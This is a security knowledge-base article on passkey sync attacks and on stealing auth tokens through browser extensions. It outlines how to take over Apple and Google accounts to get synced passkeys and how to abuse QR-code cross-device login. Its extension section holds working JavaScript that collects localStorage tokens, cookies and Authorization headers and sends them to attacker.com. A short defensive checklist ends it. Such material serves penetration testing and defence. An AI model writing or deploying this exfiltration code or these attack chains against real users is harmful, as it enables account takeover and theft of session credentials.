# KB-45: Passkey Sync Attacks & Browser Extension Token Theft

## Overview

Passkey synchronization across devices creates new attack surfaces. Browser extensions with broad permissions can steal auth tokens from any website.

---

## 1. Passkey Sync Attack Vectors

### 1.1 iCloud Keychain Passkey Theft

```
If attacker compromises Apple ID:
1. All synced passkeys are available on attacker's device
2. No per-site re-authentication required
3. Passkeys sync to all Apple devices on the account

Attack chain:
- Phish Apple ID credentials (AitM bypass iCloud 2FA)
- Add attacker's device to iCloud account
- All passkeys sync automatically
- Login to all victim's passkey-protected accounts
```

### 1.2 Google Password Manager Sync

```
Similar to iCloud:
- Compromise Google account -> all Chrome passkeys available
- Passkeys sync via Google Password Manager
- Available on any Android device signed into the account
```

### 1.3 Cross-Device Authentication Abuse

```
FIDO2 hybrid transport (caBLE):
1. QR code displayed on login page
2. Phone scans QR code and authenticates
3. Attack: Victim scans attacker's QR code (social engineering)
4. Attacker's browser session is authenticated with victim's passkey

BLE proximity requirement can be bypassed with:
- Remote QR code relay
- Compromised BLE stack
```

### 1.4 Attestation Bypass

```
Most relying parties accept 'none' attestation:
- No verification of authenticator type
- Software authenticators accepted (can be cloned)
- AAGUID not checked against allowlist
- Attacker can register credential from any software authenticator

Test:
1. Start registration, check attestation preference
2. If 'none' or 'indirect': software authenticators work
3. If no authenticatorAttachment constraint: platform not required
4. If residentKey != 'required': server-side credentials possible
```

---

## 2. Browser Extension Auth Token Theft

### 2.1 Malicious Extension Capabilities

```
Extensions with these permissions can steal auth tokens:

"permissions": ["cookies", "<all_urls>"]
-> Read ALL cookies from ALL websites (including HttpOnly via cookies API)

"permissions": ["webRequest", "<all_urls>"]
-> Intercept ALL HTTP requests including Authorization headers

"permissions": ["storage", "tabs", "<all_urls>"]
-> Inject content scripts, read localStorage/sessionStorage tokens

"content_scripts": [{"matches": ["<all_urls>"]}]
-> Execute JS in context of every page, access DOM/localStorage
```

### 2.2 Token Extraction Methods

```javascript
// Content script: steal localStorage tokens
const tokens = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (/token|auth|session|jwt|key/i.test(key)) {
        tokens[key] = localStorage.getItem(key);
    }
}
// Send to attacker
fetch('https://attacker.com/collect', {method:'POST', body:JSON.stringify(tokens)});

// Background script: steal cookies
chrome.cookies.getAll({}, function(cookies) {
    const authCookies = cookies.filter(c =>
        /session|auth|token|jwt|sid/i.test(c.name));
    fetch('https://attacker.com/collect', {method:'POST',
          body:JSON.stringify(authCookies)});
});

// webRequest: intercept Authorization headers
chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        const authHeader = details.requestHeaders.find(h =>
            h.name.toLowerCase() === 'authorization');
        if (authHeader) {
            fetch('https://attacker.com/collect', {method:'POST',
                  body:JSON.stringify({url:details.url, auth:authHeader.value})});
        }
    },
    {urls: ["<all_urls>"]},
    ["requestHeaders"]
);
```

### 2.3 Supply Chain Attack on Extensions

```
1. Compromise extension developer's account
2. Push malicious update to existing popular extension
3. Update auto-installs to all users
4. Extension now exfiltrates auth tokens

Real-world: Multiple Chrome extensions compromised in 2024-2025
affecting millions of users, stealing session cookies and OAuth tokens
```

---

## 3. Testing for Extension Vulnerability

| Check | Description |
|-------|-------------|
| HttpOnly cookies | Tokens in HttpOnly cookies are safe from content scripts but NOT from cookies API |
| Token binding | DPoP/mTLS-bound tokens unusable by extension |
| Short-lived tokens | Reduce window of exploitation |
| Token rotation | Detect and invalidate stolen tokens |
| CSP | Content-Security-Policy can limit extension script injection |

## References

- FIDO2 Hybrid Transport specification
- Chrome Extension security model
- Browser Extension supply chain attacks (2024-2025)
- Passkey sync security considerations (FIDO Alliance)
